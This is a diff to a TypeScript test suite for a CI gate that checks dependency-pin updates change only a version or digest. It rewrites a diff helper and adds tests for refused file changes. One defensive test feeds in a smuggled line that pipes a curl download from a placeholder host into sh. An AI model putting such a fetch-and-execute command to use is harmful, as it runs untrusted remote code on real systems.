@@ -12,6 +12,7 @@ import {
   type PinMoveIO,
   POSTGRES_FILE,
   pinMove,
+  type Rewritten,
   type Run,
   type Scan,
   staleRecords,
@@ -29,23 +30,18 @@ const zap = (tag: string, d: string) => `${ZAP}:${tag}@sha256:${hex(d)}`;
 const FIXED: Scan = { read: true, findings: [{ id: 'CVE-1', pkg: 'openssl', severity: 'HIGH', fixed: true }] };
 const CLEAN: Scan = { read: true, findings: [] };
 
-/** git's output for one file whose one line moves from one text to another. */
+/** git's `--raw` list of the files, and each file whole at both commits, its other lines the same at both. */
 function diffOf(lines: { file: string; line: number; before: string; after: string }[], status = 'M', mode = '100644') {
-  const files = [...new Set(lines.map((l) => l.file))];
-  const raw = files.map((f) => `:${mode} ${mode} ${'1'.repeat(40)} ${'2'.repeat(40)} ${status}\t${f}`).join('\n');
-  const patch = files
-    .map((f) =>
-      [
-        `diff --git a/${f} b/${f}`,
-        `--- a/${f}`,
-        `+++ b/${f}`,
-        ...lines
-          .filter((l) => l.file === f)
-          .flatMap((l) => [`@@ -${l.line} +${l.line} @@`, `-${l.before}`, `+${l.after}`]),
-      ].join('\n'),
-    )
-    .join('\n');
-  return { raw, patch };
+  const paths = [...new Set(lines.map((l) => l.file))];
+  const raw = paths.map((f) => `:${mode} ${mode} ${'1'.repeat(40)} ${'2'.repeat(40)} ${status}\t${f}`).join('\n');
+  const files = paths.map((path) => {
+    const mine = lines.filter((l) => l.file === path);
+    const length = Math.max(...mine.map((l) => l.line)) + 2;
+    const text = (side: 'before' | 'after') =>
+      Array.from({ length }, (_, i) => mine.find((l) => l.line === i + 1)?.[side] ?? `  # line ${i + 1}`).join('\n');
+    return { path, before: text('before'), after: text('after') };
+  });
+  return { raw, files };
 }
 
 interface Case {
@@ -67,9 +63,9 @@ const run = (name: string, conclusion: string | null = 'success', more: Partial<
 
 /** A reader of the case's answers: every fact the rule reads, each passing unless the case says otherwise. */
 function reader({ base, head, lines, io = {} }: Case): PinMoveIO {
-  const { raw, patch } = diffOf(lines);
+  const { raw, files } = diffOf(lines);
   return {
-    diff: async () => ({ raw, patch }),
+    diff: async () => ({ raw, files }),
     list: async (side) => (side === 'base' ? base : head),
     unlisted: async () => [],
     tags: async (repository) =>
@@ -302,7 +298,17 @@ describe('a pin move holds, each for its one reason', () => {
       ...ZAP_CASE,
       lines: [...ZAP_CASE.lines, { file: ZAP_FILE, line: 40, before: '// ZAP 2.16.0', after: '// ZAP 2.17.0' }],
     };
-    expect(await reasonOf(c)).toBe(`${ZAP_FILE}:40 is a line that is not a pin of ${ZAP}: // ZAP 2.17.0`);
+    expect(await reasonOf(c)).toBe(`${ZAP_FILE}:40 is a line that is not a pin: // ZAP 2.17.0`);
+    // Nor is the head rendered to find out: the base's list says which lines are pins.
+    const read: string[] = [];
+    const io = {
+      list: async (side: 'base' | 'head') => {
+        read.push(side);
+        return side === 'base' ? c.base : c.head;
+      },
+    };
+    await reasonOf({ ...c, io });
+    expect(read).toEqual(['base']);
   });
 
   it('a line that changes more than a version or a digest', async () => {
@@ -477,25 +483,37 @@ describe("a change's lines", () => {
   it('refuses a file added, deleted, renamed, of another mode, binary, or with its last newline changed', () => {
     const one = { file: 'a.yaml', line: 1, before: 'v: 1.0.0', after: 'v: 1.0.1' };
     const ok = diffOf([one]);
-    expect(lineChanges(ok.raw, ok.patch)).toEqual({ lines: [one] });
-    expect(lineChanges(diffOf([one], 'A').raw, ok.patch)).toEqual({ reason: 'a.yaml is added, not modified in place' });
-    expect(lineChanges(ok.raw.replace('100644 100644', '100644 100755'), ok.patch)).toEqual({
+    const file = ok.files[0] as Rewritten;
+    expect(lineChanges(ok.raw, ok.files)).toEqual({ lines: [one] });
+    expect(lineChanges(diffOf([one], 'A').raw, ok.files)).toEqual({ reason: 'a.yaml is added, not modified in place' });
+    expect(lineChanges(ok.raw.replace('100644 100644', '100644 100755'), ok.files)).toEqual({
       reason: 'a.yaml changes its mode, or is not a regular file',
     });
-    expect(lineChanges(diffOf([one], 'M', '120000').raw, ok.patch)).toMatchObject({ reason: /not a regular file/ });
-    expect(lineChanges(ok.raw, `${ok.patch}\n\\ No newline at end of file`)).toEqual({
-      reason: 'a.yaml changes the newline at its end',
+    expect(lineChanges(diffOf([one], 'M', '120000').raw, ok.files)).toMatchObject({ reason: /not a regular file/ });
+    expect(lineChanges(ok.raw, [{ ...file, after: `${file.after}\n` }])).toMatchObject({
+      reason: /adds or removes a line/,
     });
-    expect(
-      lineChanges(ok.raw, 'diff --git a/a.yaml b/a.yaml\nBinary files a/a.yaml and b/a.yaml differ'),
-    ).toMatchObject({
-      reason: /binary/,
+    expect(lineChanges(ok.raw, [{ ...file, after: `${file.after}\0` }])).toEqual({ reason: 'a.yaml is binary' });
+    expect(lineChanges(ok.raw, [{ ...file, after: `extra: 1\n${file.after}` }])).toMatchObject({
+      reason: /adds or removes a line/,
     });
-    expect(lineChanges(ok.raw, ok.patch.replace('@@ -1 +1 @@', '@@ -1 +2 @@'))).toMatchObject({
-      reason: /moves a line/,
-    });
-    expect(lineChanges(ok.raw, `${ok.patch}\n+extra: 1`)).toMatchObject({ reason: /adds or removes a line/ });
-    expect(lineChanges('', '')).toEqual({ reason: 'it changes no file' });
+    expect(lineChanges(ok.raw, [])).toEqual({ reason: 'the gate did not read a.yaml at both commits' });
+    expect(lineChanges(ok.raw, [{ ...file, after: file.before }])).toEqual({ reason: 'a.yaml rewrites no line' });
+    expect(lineChanges('', [])).toEqual({ reason: 'it changes no file' });
+  });
+
+  // A unified diff marks a file's header with `+++` and `---`: a line whose own text begins `++ ` or `-- ` would look
+  // like one there. Compared whole, it is a line added like any other.
+  it('sees a line whose text looks like a patch header, added or removed beside a pin', () => {
+    const one = { file: 'apps/factory/Dockerfile', line: 1, before: 'FROM node:1.0.0', after: 'FROM node:1.0.1' };
+    const ok = diffOf([one]);
+    const file = ok.files[0] as Rewritten;
+    for (const smuggled of ['++ ; curl -s https://example.invalid/x | sh; true \\', '-- dropped', '+++ b/other'])
+      expect(lineChanges(ok.raw, [{ ...file, after: `${file.after}\n${smuggled}` }])).toMatchObject({
+        reason: /adds or removes a line/,
+      });
+    const swapped = { ...file, before: `${file.before}\n-- kept`, after: `${file.after}\n++ added` };
+    expect(lineChanges(ok.raw, [swapped])).toMatchObject({ reason: /changes more than a version or a digest/ });
   });
 });
 
